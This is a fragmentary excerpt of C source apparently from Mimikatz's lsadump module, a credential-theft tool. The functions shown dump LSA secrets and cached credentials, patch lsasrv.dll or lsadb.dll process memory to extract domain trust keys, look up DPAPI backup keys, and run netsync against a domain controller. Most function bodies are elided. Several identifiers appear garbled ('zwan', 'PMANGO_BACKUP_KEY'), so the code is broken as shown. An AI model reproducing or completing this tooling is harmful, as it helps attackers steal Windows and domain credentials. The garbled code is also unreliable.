...
NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsOrCache)
{
	...
	if(!secretsOrCache)
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &cacheData.username, NULL))
		{
			...
			if(!hashStatus)
			{
				kull_m_string_args_byName(argc, argv, L"password", &szPassword, zwan);
...
NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
{
	...
	{
		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), zwan_NT_BUILD_NUMBER))
		{
...
NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
{
	...
	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
	{
		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), zwan_NT_BUILD_NUMBER))
		{
			...
			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (zwan_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
				{
...
void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PMANGO_BACKUP_KEY secret, DWORD size, BOOL isExport)
{
	PVOID data;
	DWORD len;
...
NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport, LPCWSTR systemName, BOOL isSecret)
{
	...
	if(NT_SUCCESS(RtlStringFromGUID(guid, &secret)))
	{
		...
		if(NT_SUCCESS(status))
		{
			kuhl_m_lsadump_analyzeKey(guid, (PMANGO_BACKUP_KEY) secret.Buffer, secret.Length, isExport);
...
NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
{
	...
	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			...
			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, zwan);
